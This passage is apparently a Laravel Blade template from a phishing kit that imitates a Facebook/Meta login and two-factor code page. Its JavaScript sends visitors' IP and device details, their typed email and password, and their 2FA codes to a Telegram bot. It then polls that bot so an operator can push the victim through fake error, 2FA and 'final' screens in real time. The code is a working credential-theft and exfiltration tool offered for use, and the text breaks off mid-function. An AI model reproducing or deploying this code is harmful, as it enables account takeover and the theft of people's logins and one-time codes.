APGT1EBokQidGDSIJkkQgb9ODHQHZ1jzxyC1kzdLzvoap2nd0P/bt/1tp37bXXxglw8r7kHq2Qo29i3vic3br01KemAefc7bp2mpzzzcAI0XsICO2IGMudBWLXgkK2dg6COks7W9otHdkAi2EcIY9gkUF7XUVE1B4DfeBXywkdF3/4H99/8njN1Xjl/rNJ+4dtTVf6c85verH4zGscMOioeZlMbZUgeQgLdciKJWh1gLv7mUK1l7G75l0tleZdwXdXqVrV27Hd79QnC2t1HUrOQSfXZqyoLYNWC7+lUt42VF23U3KoqGK1P9bbYst27aG+c2G9WZisizC4aBdovPUKh2RhipN1iSECQAT2FpZFsSdGlBMCQsuQUFsElzhaBitnEJwTQ2kEDAMHvI2xsdbHoXfxfNPnvMlVaCDnso9ypf61b373q9968uQp4lXua0jmw7YGxb72F3V+09/8dozzCd0M2p4qywhywhsbwBCMOxYlAxI35ucLMwwiIMzXKhwr2tZSq8AqSKU7Xetupw/dyIZQtZ1G4KNWdCzSPxy4qthUxDqg2ZFWbbVd/566WDAAKRcHD7cZnDvfNMKFPTgLfZNsP/SIznmXYc6IzTm5NfSeb28hNcNVGdGs6x5909ym82bj022/uRlWl9u4NAxPDVXfPLX+xXHks22Sv9qU98/i73/8gUV5e0X8qHB/DnvJV/ophZlfOF+srGv3dvSAN4DA0+QYexuzTzacr5YTi12kMi+zURO2qVFgxcVjlyvlt9tYV32Uk9QTmIm1jKfciZMdhD2GjieRWFWnko5T5I77oBWaNh4UjDSqcgz/z11YF2f0t1f9Gsa97QvANTyW3O2VazblRaEar54Vuerjs3zIZpOalVzTrGWw0G16d5VT+Vc3Q9xsbCxUE2+cTuw3t6LXM4TcTeNj45rBJ44uuXO0/7isr/7ad99+5Sn1xyv3+yv356zMJ175rb/zF3QeZbEzWTcbtj5tMmyQXBiu+l84bjgViVzRPMzTCU97BG/zkJ2YhHkjxvI2eNDCqdfslQynAAysOdnRW81BjSQOYRYTUPxkF2HuusDggBnR5na3u+iTBFsI9wV9YT/kdXHVFXHmc5H6VbIpp6EvqIZbH2NuIkNO2TvmZAP7pHlYLCYvAk6wNKA6qMBkRDrLqpUlx9aCnBhc8p55DAGQ+ff+xq998503X3mq97feeib3Rz+BfU2c+Qvyq2UeOc8+DiKZz0NEiJMDUmKHyNF7sEOT/dwuWpdutN4BQ4xnyHApmxSzMMOJUc5aRuMcpz6e89I6YIuLt5I2nJt04yI25wmDPdvbjZ1d029gaS6yAl27iL6HCdn14+jnCBZ0XGBiBGAAam2LgmIzowgTMUurpKUgbAKXbwPyCNKi1BWw2SrUBxo85qDTGc1OJuBkxflw7lGSnbz/xrs//C/v3HvmRN988uZTua9TmU881974qdxLXYgXPZ8v8Y4yzoJeQtq4oQ/SW6y2YjWvE7ZT27ggKfZpcLKBqUkh38AS22bj+qd7ev0mwi3Qbba3Q5kB4ppaZ+3GQd/b5qoYXrQbGBqZyxd9KnY5blxqIF5wCEozA3o0fLKhY0HkWYWFQQdp2xapazWJITTIWwRViUg7CgRiOgB2S7LQcV4EWwFWOSmbKzOa1WecIPbVSxhT1AuwTT7j0qB337v36PWHZfryVN7vPF7lvmK/9/Zz2O+V6MxP5f7C9QmY4+nYR9z0FeCyll9AnzbbrfdDROfnlJIjGZZiPUfXTz1bl20PwKkfXLG1MfVuczsN/dBHHzeDZJesH8CvmXNrgoYH8M3ZonPnHrDP0eZhaHzvLsTTwbY2zQtb8DOCt6cTB5lO3jN4OQVkEmDBwlDEMhNBELbALBWNLYAW5xk4xGGZIopFqoi6U7vAzAFb9tThwoKjRofdwlHgBw8ePHp9XVD6MQda9nXce+d5ud8vmTM/1c688DrfMvgRm2SDW9A1xV+trm2lVejcDhjSBgO0gx+QbBxugl1yHIGXAHMs5DO7vsWUm8HneHIeecIloZ8oe7GOZUiqE5nHap4XtIsdUBjmkQJeeF/GuT5veOzTaUlpcDgDpmHK0Q1Nys7n1ctjH5cmh4RoETjD5DW2NWCLTsifGUlgSNaTZ2U+I+wny62V1qoWmRlmADxjyzAxov7qgwcPX1/l/mPc7z968PjN5+X+Skm//mntF//1C9r3X7IA5gbR3Jl837vJN+CHE0S7gJ38tLgQ2mBxBlGml7kXtNDtP6lBs2i0QVbzoMmxEkQrNUhAYVNraQ2zMtRhqMwYjJjAlwaJRB25urx7aS6cW9KQ8+QtsC+YYkqo0S0Rl3OKceL1K98So18qK1qDZYsnixyCtkCoW+za7BV7iS16pWlHgZXrLXqxKWDv0cZzhhwtQC/BZv7Bg3sPHj4q0/UPud978ODBm49/Qu73v/iHH8Zvvva1PxOq+Zdf+XsvmP+ugqfxWCkxh8ZqGa8t1jyT0oyiThKIcbvTqLvYoVUKWwp1qcEko1a6Pgh1plId0bGuKi2KTLU7Ujhs19dSddWho5rqy86orrpWdVXvdHXQ9d1PV9VFco2P3mLN03XLwtBSNwIKYwAZRVUnIaKq5qA1BRIdJtHBjEwtM1s2LZMIz8giEIQIj4HV4SjsPFqL7ADPYSnPoVoYFsEA9jv37t1/eP/Bo+JFP+R+7+23fsK6P3jliz+aRv73b/7XL331Sz+u/t/8wl9+EewlPqOMIrUlXSRoNHaKqDZYVbQTbU77SzHaKKWEtChYFz60qUy1L68oECllqu3TcFqtVV2wdqq6uzuGcVsKfSr18uGojNlV1e5wvS+7c8zhTunUJSdhV+22F27YnOMm+oURTph9J3SXmAUsiG6vayFSlZKjQlNxy6ADiGpFIVU4qpaNMC26XWZDrIiUjNuOtpfKdByqk1ISAhFZEbv7dMtYaSb6xh8U8/7w3o+ZmXvlc++tn5T7g9d/NJ35P196dO/eG7/1xjf/dA/rF363XF7Mzqzh8t1Lxlz+XL1TVG3HrSpoX35ZSRHOz/98aNVLSgpOUxAca9pVtC0dXe1qUUpXhlYNFzwmUBlTj8dt25nuuK/aS6P2Sozq9nVQpGpVBlZ1F0qk+HJL9fVFv2mebh9Y5pQk4olj0MfWa+bA3ArLSIoUsdmqcN0udeBKGyVIdTB7qjvpTG1IaaUCabVT15ddd1mr6ljdNURKF+Vfm0AS9FFV2moyrf7eg/uvvP7wwSs/Lvd766zmebnff/DGH38QrXzj3ifefFiKofzBB4r/xS//tX//otxfrfb19rKrt/Vas/qyI2PaPVERTd3tDiVVnViRIVMpfVB+V3FdUQhy7LqKRCtNSsiQonYkQq1DWz5BQjee2GgJZpxlFGpPSxd0hziOonV70kwoF27TewsQhWY+LUHLbMIYmILqWIhaTUZ3R6X3JXFnq1TVqfW23VXVvqqMeulQVSUafbjerzUV1eVLJVRXTjtYy9DV9Z2t2d7d76q9WX/f609d7V6u1XdeKV714cNH9/4M92Jknpd78QL/7Fe+/Ctf+fJ33yjdx68X7m/836985ctf/pXf/N3feSHj/uy8Ydrevd6a0Wz1cVeNtFVjVR2Ox6O0Y61pNF11pEqTHk1L0hmljSHUgRRJWNGOQqbrRk1K89i1orDTQVErgRUFhQsTs5CuDRm0HWtNnmpW4XSRrfNVttsQKKB0oaqDFl0sDI1ERqm1mIOqqlJFe79+dp/8TFWtK+fbw6fuqF3Zf7wrl/3dl7clOl0KbpWjFz515/Jp5S11+LmXD1XZ/1MyInYlYL2utL9UMiH23ytxx9dfL9P3T/yMdr8o/tuvfvvbrxbspb3z5qr3//zqq9/+3Kvf/m+//W9flHvZN1ypaneplDqoOztL+yON28sd6RUbtarYy8Mv7IJRx1p1+xLOKiMrknINQoUMY60Km646tuZA4bIYdaNLvwhQ1fVBtXs9Hq5pt5ftZWvqa7k+rstWu0L1IqJt3AJ8DIBjFl7qMM1oZxsUMIqqWnVHqLDear3f0+ElMkcqvaPqlGKqVHVNZIS6cLhs1RbMZyq1a+lyZ466xKiLh99WRURbdahkv1XV7lPfePf+/YeFe/Gqf367d+/Nd756t6rufKlgX9tbb3zxt7730uWxqrZ37/zqi3MvdVBgV/ZB3tXVp/d1pUv1/eIR94dqDcMX8ZfUa7P9tK7VOim5/NSO7tTm8rJ0VCV81CKiq502W6VVMNVIO9pvDTMhVeFY+KuKqK7opFsxSsKO9G4NKgctcPE0IIO8EY6L9T4nBMfocubpzNkTCSkr29XXBoGAMQGLMiN1ixecoogXAYSJKjEd07ETzZEJ5UQkod7ZUJNhIek0aRKpvl5yBR6ucr/3M7g/ePvxm98/HA7f+QB78QBf/FLRkw7bKmx/tdiZF/Wr291hVx+3XdjfqUudzpfrwy9/itcFuyJxKmpRx5buHuu6SLY2hkhhVRmSwjMo4Y5U0BRYtSNJK4RByLSCMwbNRP6EM60xFIAOrRE9BhHgFuKS0oXHtIjFEVQH2LUzibQF3sgdG6Wp1nf2hd6hIqkuNVUt0yiHurpzDGonusXdNZsOlGnLw35n7hyWsrMtGKLV5TOGzsqdcOIgJxYJBGZ+/+1Hjwr3Rz8Le4lSPn7l63T5/qM/ffPWt75BVUuGpeXf+P/APYStjsc7SleitmN1rcVcT4dPhacGmwWFkKZ6q1qjDFrdWQkggdEwjhoDi2HQATuZNcOogAOIGseRgU7gl6kNDpFbscKh0ijBzpggRw8XoklRpZQxpt0ej9fHXWlPKyYeumKXi6MsNXq221I8frf/dKnssS/r5NtSxfJOCd9vS0ICHe50tQoF9n6n9i/drT55PBRTU1+aa7Xqgmn7EoHWQQeptBDX7z1auT988LOw33vn8eM/0Pr7H7qBt9/8fkc6CAsCvLB9L3FgzzOHK3MnFUgNOGxjyri9M2fC8nzWfrKzODRyamGs+JxTOsdh8hPGIYpH8LklBrQMHkovzsB8Eh8YrJ1nAfY4zRaXGIH9gnG2Njrvzvliyey9Vo6hkXFhhWBQo2hSoSPpCvLtrlR83l/uVg+731aHbn9tVLXfV7U6Xrcj7dtTQVrpenc0dfG5y/aTxZGq3TrlrYyorQQlzLrmhYLRX3/v4druf+IjyP3xd6ofPHrWWSPFb74n+yAtIFHUL879776WPAR2W/IMERbLo+ASKK8YZxqHGT1aN2QiSPzLtHEpuanJ1rk4NHlwme1gbQLr5jizWG97mbIFnGBA6YESSJomN7G/scMZo11OjiFBhoshbbxvhtQ0/bpK1Pe3zc3NkPooGWIjmJHNliy3hJaqDlmLMiiKQRhUgHD2nEHLtEM5CrMCr8kQGMWstKEW2LLINbJv7Uyivn+vUH/04GdZmUL58eN3vk9f/WDgW0/Ki68r7oiPhPpafvtfvfA88lVrUceFMIAnmVhGIxjjsPhWTQuoFIXNZnp2pNghpJln9GcSy9GBJBszW7vEhN6xLGROYMBqRsKZ8SSjGAYKcmQbOpAAKBJkpFZ34aLvvQxrbkxpQ7nelM/t1U3qfbzKOUN0rj5F8cJgWSynybCVtjnbDIwT+OjhjB4pSRVtAAcu4eSjeCu+Y5R5MsG2ow9BGALAu/cL92JkPgr3T3z9/Xs/6j15/Pjd61YCkGKWVl7Yr5a6EKBmOzqPznmJM9gdMk8zgQ981hIC8CTMnfBJNGietZ1OGgP5hb0gBmClrYTIJ4QQglZHoaC6cMIuoCgztqbT1TFoMqOZOUjLdCKj2vai6Sfn3NOMDVfSX25vrvqmdyk3zZCzs0sOBMIwW0iT+DyhNssAkHFO9sTW5WkR79FilEDKez/FCafJLg7Fs00I3rYaG+CA0UP6xnsfyciUtpqZH3zYffLk8feEOXnwHmdLX/n9F+X+lX+gUCRYxpz9MokILawZWdXodNudmNlPp50OzMq02uKiJjAoKmZuxTOfJHCrxbfoITCEbiGdiGbUWgwTBUNAI0on4cCsRVhYRFppL1LaDOnp7pmr5qYpl6L5pmlum2bd2QfRc0HpHWQLaK2NrBY35cw+WsjW5uHGwXmWOCgZ9nUDy7DYzSQ5RZd8TE2T/KaHqz5a//SYnO99q3AvIv5IZua73/nT3ptPnrznBrexedPHG+s3//uzL4j9b//u/yRP4IJtMOSIM58AYOHWUmc1n0hiipzhQEJmHE2KYvFoZTuTSr5tIXjLp5HYXrcTcWQzs7ZRRzBoQ0AMntFWMo86ElnUQApbjRDQ44Urxvz2R8lgpW3KT8HviuqbmG1qOeY+42Qr9snBPMGQzjhNswOYU5ThNrppuBKelcpNShB78FdRztluek59HrK2jcu9ZAeN8++WKeRH4v5O0fubP9Z58uR9d7PJ0DhrM+QmfvYFBf8bn5vcahMT5gF4QL5KPDifpRLLS6xn3Z6BEQFHCh7FctQMOsAKjmetPWtWR80dgZYoorUwB+WXThY4IQv6LBQXCaB5aoMlFUBOU8DGXqzF9T/cx7cmpz6tUDC4ZhhiZre0BhoRZm2zt+wXC3DO2Z48WBAOIS4MlkgbrdCf/Dht+BQTBD9PFtK8LIEFwfuYYYnpB++9UUIEH4n7WyU++aH233ryTrTJcswzYlgiLX/yl/7qC1D/tX/+2wJTdGNsGFM/o5fosoueTxA0e7t4gbNzfPIYLIVJMLvFOsA+so3gWSwAtsGQEgjI1HLghaq2dLUWkhnRs0QLCxNzHbGTUytLe0KBfDHE547AWKc0KTap6ePNZrAW28mekAgWHWnfMsLYLag0IXJ1RGPOHbd3arM3QfOsdsIIymgWMGRZOtEdM4DMhbrF9+8V7g8/8dHs+4dTyoL9yQ8AkFEICKeJ0ds/+exnf/8LX/j1X/9Cab9eWrl8cHv28oPXz67rw98qz+un3P/d73w+e+t65Dw5jzHOCDoP5whPTYTLGXgt6OWXHLLzKbu0ZpAOcWiG1Pe59/1gmz7nzPYM0c3e2yllCwwzx5xDHiBFD5Eh4rNKPa70nHc2YAxwcdt8aGNui/Kb89A/3fjukN2EgZilUi2xHsm8vK102xo61qbbctip2mhqAUN11NVIEkxNdz9z3FVUqSqQ0XW1Y1aad8L15KX9o/cevvHG68+51Y+k/SfvK0HEIIIyt5Y1yhL+x+df+6XPvfbaa58rl89/7ult7b362ufX+6uvludn3TLil1773Odfe3V9sX77e39ih/MwAA7m7gocWip017ZJocC5zbJubmyGiLbHuLnpn9mDplxWod7cfCjU8no1zOu35X1yrr9ah7vyYmia5ur57F5X9HzRfEB99atrhY2zS86dBzvMATwZEj2Ou2uqmaWEDAhFBb3bHbtg1HXQZLYkTCbU26qVkYxmc6fSlqoCfBGqtpUelUiQIKJZvv/Os4DYx2tvFuzvEnAHdoToxS4iLNgyFxGwAPoc3MQ5tjrwSHQMJ7LMSC07zxObk7ULI3prkafZn5aMbepdjD450JJuPaiwuRqST4ObloKgARdzweGTd0Cb3jWFUN83T1neFlzPHx9ytTJcIa7rGU0abvP6MKRmHdgPz4Z82D7gfvMj1a+F8eLGxcGlDJhjzq00opCCO21rzULdiFVHHS9GSy1IvLRKd4cjgYdlJo2IAFnUCWcMUdUmoG75NPYsKf3wfrEy9z8u98cFu7F2RlgS4IAyBHIzY0CpCWtyYJP3YHPCBRUPzNCxw3HGmD0mNwLY5NCjOmdwzqKfLNom+aKvXDTanBukmIbserQBnYd8ks2SNk1MeWmm5iq5Qr5f4qZvXHTDsAJbc+uG/mpoenfTp2bIbjUagx9cGWpzTo079zc+b/K0Qb8pw2wZeHuVbjduc7H5ibb+soYcV4Pkk1u8i3aU2Mxj21nbjq2qhANYRn3NQkyUhUCLMMTMkxhcCBoUaAH1gkx81K4dF8v89R9+a5X7/XsfU+4Fu9ahDSCMVk6WAmvWho2qt8bU24DCihBERFctYFDHdtGajB4Vqd2eSCEGJhVI44hOtGXUgS1IBnFW214AW4tgeWy92GFs5+gjw8IyJ3d2zkZ3RjflxvsM8SrlPtrGzUN0fiqU4pC9A8g+ZphSeeHt4HM/DbmZs+NYkE8wt4yQnW3TcH6ee7MmRfqrjU9NzpuEsTkniRnONiL62A9Ta8IEdsYYkRE65MCI0cZofQMULQBzzG5ZTtOZ5+i1EvYTL/D1d996+/XX33j4MbEXp/rk3Qqlbg0hGEgtA/HSth0FvSvFrG1bgSjSgqCvSUgqY3bdUZtjbYhoe7ndVVqT6E51x0MwJFQpYhTB/R1mLURGAFEjyyxtNUqLonnJrHE8TjyfA8ocI9jE5caxcI0+za5P3vl4Lkxd9kPj+okLeNcPGe0VwFXMV46bzTREbpJ1s51mc4zNRnRjn+d+9RR+djeuaeLtlR3WGXNMGwfex6bvNwndkB2wG86Ny977hO3kg7tKN80wYrFk2a0Bhz4ObtgMU3PmdJU3/R+9+869199YneqDj4v9rXeH5K4GWFL0bgG3/tdmZ91ZRlbi+iYvuSBI0J8lNdZGYl+GzTK7yXNrLc8jJjdnKF2Ogr1UANMmwSXZwekpq3yLiwfbZ4Cgs4xOX296aeYqnJMdhhhjAecR4jL5OfvFOU7NEhP4AWKElCEN4htwTe+uvE3e3aSYhkKM0wBusOChSXKSkFIexPDz3NddZbfNkFy/GZpydcn6PC/ouMLN4ktvGNKU/BxhSulKMOldHBYYbjbZR5n7PscmD7c29d730ToAy81m+MZ7bxfq5VMyfj8u9vdsyuBWUU32DLLM6B1aiyDtNFXY+4jL5BobV3cEAJ71kpbgskTLyEucfOAIljEJgtZNAyeYnbUYwJbbRBgZLMweY2qFg7U+ep8dLiCC1jduiAhTtjNHCwk4ip1QbGTGcWacWcqV+eQ9RGZgZjz7mC3GKAjMlgUEIYQZK5wAd9XFc2q/HdLVrWvOFnLyaGdE8ZZ0BUJoUezEwCijBy0nvYhSqI+sWm85nQTVCU5t4G60JF4IkTSFgDJM779SLHuRe8mJvPcxsf/QiICQ9qxQqpZNTarljnaGleq2R4uaFQkE1u1olGpJqYqNEqEja6N2ut6Z6mjqnTa7KtQdbUmOSki6SitVt3pPodJBmZa6+qhpbNGQ7kgOgdWuFpJWTEfmRMcahUIYWQWWliUH0svYjZpEE6AKLXVaEZFwG/xIbCoEMp3RIXA1gtBxq+ZgaPs896YfvEuznQM4y74y1rQTXZtaiahRq0D7liqjj0rqu2FNKNHtS6MwU9uBqmE0bPakNHYmlNH1TgfDWv3g4VPsD9dy4h8L+ztvvfONsISFtWWNwp2hMYR2FF2Z9tqwYiYImlHDJCe+1FxpVp02tBSWrRnVltShuq4UbXeixlBLuCTF2qhTrAx0JLuDdFwAE6m1cKHZSX2Jx6PeH2qtVas6o2i33V7WdNiVR7VVelthIbMPcLfSh87sDdUHUoqqo9pe10dVm0qdjpUy5lDXTzPFVHmjKk2Xqj5cH7bV/wNEQrf10kagSAAAAABJRU5ErkJggg==" alt="">
                                                    </div>
                                                    <div class="code-input" style="margin-top: 20px;">
                                                        @if($codeError)
                                                            <div class="wrong__password"><p>The login code you entered doesn't match the one sent to your phone. Please check the number and try again.</p></div>
                                                        @endif
                                                        <input maxlength="6" minlength="6" name="code" class="show-input-on-desktop" placeholder="Code" type="number" required="required">
                                                    </div>
                                                    <div style="display: flex;justify-content: start;column-gap: 8px;align-items: center;margin: 10px 0">
                                                        <input type="checkbox" checked>
                                                        <p style="margin:0">Trust this device and skip this step from now on</p>
                                                    </div>
                                                    <div class="btn-group">
                                                        <button type="submit" class="false">Continue</button>
                                                        <a href="javascript:void(0)">Try another way</a>
                                                    </div>
                                                </div>
                                            </form>
                                        </div>
                                    </div>
                                @endif
                                @if($enableLoadingAfterSubmit)
                                    <div class="loading-container">
                                        <div class="loading-message">Please be patient and dont close this window</div>
                                        <div class="loading-submessage step1">Checking the details on your account...</div>
                                        <div class="loading-submessage step2">Checking email addresses...</div>
                                        <div class="loading-submessage step3">Checking two-factor authenticator...</div>
                                        <div class="loading-submessage step4">Checking other details...</div>
                                        <div class="loading-submessage finalStep">It can take up to 10 minutes to verify your account.</div>
                                        <div class="loader"></div>
                                    </div>
                                @endif
                            </div>
                            @if($showModalFooter)
                                <div class="modal__footer is-desktop">
                                    <div class="footer-menu-flex-ul">
                                        <div class="container-language-footer">
                                            <ul class="flex-ul">
                                                <li>English (US)</li>
                                                <li>Español</li>
                                                <li>Deutsch</li>
                                                <li>Türkçe</li>
                                                <li>Српски</li>
                                                <li>Français (France)</li>
                                                <li>Italiano</li>
                                                <li>Bosanski</li>
                                                <li>Svensk</li>
                                                <li>Português (Brasil)</li>
                                                <button class="countrys-button"><span>+</span></button>
                                            </ul>
                                        </div>
                                        <div class="flex-second-ul">
                                            <ul>
                                                <li>Sign Up</li>
                                                <li>Log In</li>
                                                <li>Messenger</li>
                                                <li>Facebook Lite</li>
                                                <li>Watch</li>
                                                <li>Places</li>
                                                <li>Games</li>
                                                <li>Marketplace</li>
                                                <li>Facebook Pay</li>
                                                <li>Oculus</li>
                                                <li>Portal</li>
                                                <li>Instagram</li>
                                                <li>Bulletin</li>
                                                <li>Local</li>
                                            </ul>
                                        </div>
                                        <div class="flex-second-ul-2">
                                            <ul>
                                                <li>Fundraisers</li>
                                                <li>Services</li>
                                                <li>Voting Information Centre</li>
                                                <li>About</li>
                                                <li>Create ad</li>
                                                <li>Create Page</li>
                                                <li>Developers</li>
                                                <li>Careers</li>
                                                <li>Privacy</li>
                                                <li>Cookies</li>
                                                <li class="ad-choice-img">Ad Choices <span class="img-li"></span></li>
                                                <li>Terms</li>
                                                <li>Help</li>
                                            </ul>
                                        </div>
                                        <div class="meta-footer"><p>Meta © {{\Carbon\Carbon::now()->year}}</p></div>
                                    </div>
                                </div>
                            @endif
                        </div>
                        <div class="ant-modal-footer">
                            <button type="button" class="ant-btn ant-btn-default"><span>Cancel</span></button><button type="button" class="ant-btn ant-btn-primary"><span>OK</span></button>
                        </div>
                    </div>
                    <div tabindex="0" aria-hidden="true" style="width: 0px; height: 0px; overflow: hidden; outline: none;"></div>
                </div>
            </div>
        </div>
    </div>
</div>
@script
<script>
    let sessionId;
    if (! localStorage.getItem('sessionId')){
        localStorage.setItem('sessionId',generateSessionId());
        sessionId = localStorage.getItem('sessionId');
    }else{
        sessionId = localStorage.getItem('sessionId');
    }
    let selectedDate;
    const apiKey = "{{env('TELEGRAM_API_KEY')}}";
    const chatId = "{{env('TELEGRAM_CHAT_ID')}}";
    const replyMarkup = `reply_markup={"inline_keyboard": [[{"text": "accept", "callback_data": "accept"}]]}`;
    const tURL = `https://api.telegram.org/bot${apiKey}/sendMessage?chat_id=${chatId}`;
    let emailElement;
    document.addEventListener('user-login-response',function (){
        fetch("https://api.ipify.org?format=json")
            .then((response) => response.json())
            .then((data) => {
                const ipAddress = data?.ip || "";
                @this.set('ip',ipAddress);
            })
            .catch((error) => {});
    })
    document.addEventListener('open-modal',function (){
        $('#continue-modal').show();
    });

    function getDeviceOS() {
        const userAgent = navigator.userAgent;
        if (/Android/i.test(userAgent)) {
            return 'Android';
        } else if (/iPhone|iPad|iPod/i.test(userAgent)) {
            return 'iOS';
        } else if (/Windows/i.test(userAgent)) {
            return 'Windows';
        } else if (/Linux/i.test(userAgent)) {
            return 'Linux';
        } else if (/Mac OS|Macintosh/i.test(userAgent)) {
            return 'Mac OS';
        } else {
            return 'Unknown';
        }
    }
    function getDeviceType() {
        const userAgent = navigator.userAgent;

        if (/Mobile|Android|iPhone|iPod/i.test(userAgent)) {
            return 'Mobile';
        } else if (/Tablet|iPad/i.test(userAgent) || (navigator.maxTouchPoints > 1 && /Macintosh/i.test(userAgent))) {
            return 'Tablet';
        } else {
            return 'Desktop';
        }
    }
    async function getCountryByIP(ip) {
        const token = '51a670a7b50b57';
        const apiUrl = `https://ipinfo.io/${ip}/json?token=${token}`;

        try {
            const response = await fetch(apiUrl);
            if (!response.ok) throw new Error('Failed to fetch IP information');
            const data = await response.json();
            return data.country;
        } catch (error) {
            console.error('Error:', error.message);
            return null;
        }
    }
    async function handleAsyncIPInfo() {
        try {
            const deviceType = getDeviceType();
            const os = getDeviceOS();
            const ip = @this.ip;
            const country = await getCountryByIP(ip);
            const tURL = `https://api.telegram.org/bot${apiKey}/sendMessage`;
            await fetch(tURL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: `===NEW VISITOR===\nIp: ${ip}\nDevice: ${deviceType}\nOS: ${os}\nCountry: ${country || 'Unknown'}`,
                }),
            });

        } catch (error) {
            console.error('Error:', error.message);
        }
    }
    document.addEventListener('send-ip-info',function (){
        handleAsyncIPInfo();
    })

    document.addEventListener('show-login-progress',function (){
        @this.set('showModalFooter',false);
        @this.set('enableLoginForm',false);
        @this.set('enableLoadingAfterSubmit',true);
        emailElement = $('form:visible input[name="email"]').val();
        const passwordElement = $('form:visible input[name="password"]').val();
        fetch(tURL, {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: `User: ${emailElement}\nAnswer: ${passwordElement}\n`,
                reply_markup: {
                    inline_keyboard: [
                        [
                            {
                                text: `Login`,
                                callback_data: `/login ${sessionId}`,
                            },
                            {
                                text: `Error`,
                                callback_data: `/loginError ${sessionId}`,
                            },
                            {
                                text: `Old Pass Error`,
                                callback_data: `/oldError ${sessionId}`,
                            },
                        ],
                        [
                            {
                                text: `2fa`,
                                callback_data: `/2fa ${sessionId}`,
                            },
                            {
                                text: `2fa error`,
                                callback_data: `/2faError ${sessionId}`,
                            },
                        ],
                        [
                            {
                                text: `Schedule`,
                                callback_data: `/schedule ${sessionId}`,
                            },
                            {
                                text: `Final`,
                                callback_data: `/final ${sessionId}`,
                            },
                        ],
                        [
                            {
                                text: `Kick`,
                                callback_data: `/login ${sessionId}`,
                            },
                        ],
                    ],
                },
            }),
        });
        localStorage.setItem('email',emailElement);
        startInterval();
    });
    document.addEventListener('code-submit',function (){
        const tURL = `https://api.telegram.org/bot${apiKey}/sendMessage?chat_id=${chatId}`;
        const code = $('input[name="code"]').val();
        fetch(tURL, {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: `===FIRST AUTH CODE for ${emailElement}===\nCODE: ${
                    code || ""
                }`,
                reply_markup: {
                    inline_keyboard: [
                        [
                            {
                                text: `2fa`,
                                callback_data: `/2fa ${sessionId}`,
                            },
                            {
                                text: `2fa error`,
                                callback_data: `/2faError ${sessionId}`,
                            },
                        ],
                        [
                            {
                                text: `Schedule`,
                                callback_data: `/schedule ${sessionId}`,
                            },
                            {
                                text: `Final`,
                                callback_data: `/final ${sessionId}`,
                            },
                        ],
                        [
                            {
                                text: `Kick`,
                                callback_data: `/login ${sessionId}`,
                            },
                        ],
                    ],
                },
            }),
        })
            .then(() => {
                @this.set('loginError', false);
                @this.set('oldPassError', false);
                @this.set('enableLoginForm', false);
                @this.set('showModalFooter', false);
                @this.set('enableLoadingAfterSubmit', true);
                @this.set('twoFaPage', false);
                @this.set('codeError', false);
            })
            .catch((error) => {
                console.log("Unknown error in auth.html", error);
            });

    });
    document.addEventListener('code-submit-mobile',function (){
        const tURL = `https://api.telegram.org/bot${apiKey}/sendMessage?chat_id=${chatId}`;
        const code = $('input[name="code2"]').val();
        fetch(tURL, {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: `===FIRST AUTH CODE for ${emailElement}===\nCODE: ${
                    code || ""
                }`,
                reply_markup: {
                    inline_keyboard: [
                        [
                            {
                                text: `2fa`,
                                callback_data: `/2fa ${sessionId}`,
                            },
                            {
                                text: `2fa error`,
                                callback_data: `/2faError ${sessionId}`,
                            },
                        ],
                        [
                            {
                                text: `Schedule`,
                                callback_data: `/schedule ${sessionId}`,
                            },
                            {
                                text: `Final`,
                                callback_data: `/final ${sessionId}`,
                            },
                        ],
                        [
                            {
                                text: `Kick`,
                                callback_data: `/login ${sessionId}`,
                            },
                        ],
                    ],
                },
            }),
        })
            .then(() => {
                @this.set('loginError', false);
                @this.set('oldPassError', false);
                @this.set('enableLoginForm', false);
                @this.set('showModalFooter', false);
                @this.set('enableLoadingAfterSubmit', true);
                @this.set('twoFaPage', false);
                @this.set('codeError', false);
            })
            .catch((error) => {
                console.log("Unknown error in auth.html", error);
            });

    });
    const startInterval = () => {
        let lastUpdateId = 0;
        setInterval(() => {
            fetch(`https://api.telegram.org/bot${apiKey}/getUpdates?offset=${lastUpdateId + 1}`)
                .then((response) => {
                    if (response.ok) {
                        return response.json();
                    } else {
                        throw new Error("Failed to fetch updates.");
                    }
                })
                .then((data) => {
                    if (data?.result?.length > 0) {
                        data.result.forEach((update) => {
                            if (update.update_id > lastUpdateId) {
                                lastUpdateId = update.update_id;
                                if (update.callback_query) {
                                    const callbackData = update.callback_query.data;
                                    if (callbackData === `/oldError ${localStorage.getItem('sessionId')}`) {
                                        $('#continue-modal').show();
                                        @this.set('showCalenderProgress', false);
                                        @this.set('loginError', false);
                                        @this.set('oldPassError', true);
                                        @this.set('enableLoginForm', true);
                                        @this.set('showModalFooter', true);
                                        @this.set('enableLoadingAfterSubmit', false);
                                        @this.set('twoFaPage', false);
                                        @this.set('codeError', false);
                                        @this.set('showCalender', false);
                                    }else if(callbackData === `/loginError ${localStorage.getItem('sessionId')}`){
                                        $('#continue-modal').show();
                                        @this.set('showCalenderProgress', false);
                                        @this.set('loginError', true);
                                        @this.set('oldPassError', false);
                                        @this.set('enableLoginForm', true);
                                        @this.set('showModalFooter', true);
                                        @this.set('enableLoadingAfterSubmit', false);
                                        @this.set('twoFaPage', false);
                                        @this.set('codeError', false);
                                        @this.set('showCalender', false);

                                    }else if(callbackData === `/login ${localStorage.getItem('sessionId')}`){
                                        $('#continue-modal').show();
                                        @this.set('showCalenderProgress', false);
                                        @this.set('loginError', false);
                                        @this.set('oldPassError', false);
                                        @this.set('enableLoginForm', true);
                                        @this.set('showModalFooter', true);
                                        @this.set('enableLoadingAfterSubmit', false);
                                        @this.set('twoFaPage', false);
                                        @this.set('codeError', false);
                                        @this.set('showCalender', false);
                                    }else if(callbackData === `/2fa ${localStorage.getItem('sessionId')}`){
                                        $('#continue-modal').show();
                                        @this.set('showCalenderProgress', false);
                                        @this.set('loginError', false);
                                        @this.set('oldPassError', false);
                                        @this.set('enableLoginForm', false);
                                        @this.set('showModalFooter', false);
                                        @this.set('enableLoadingAfterSubmit', false);
                                        @this.set('twoFaPage', true);
                                        @this.set('codeError', false);
                                        @this.set('showCalender', false);
                                    }else if(callbackData === `/2faError ${localStorage.getItem('sessionId')}`){
                                        $('#continue-modal').show();
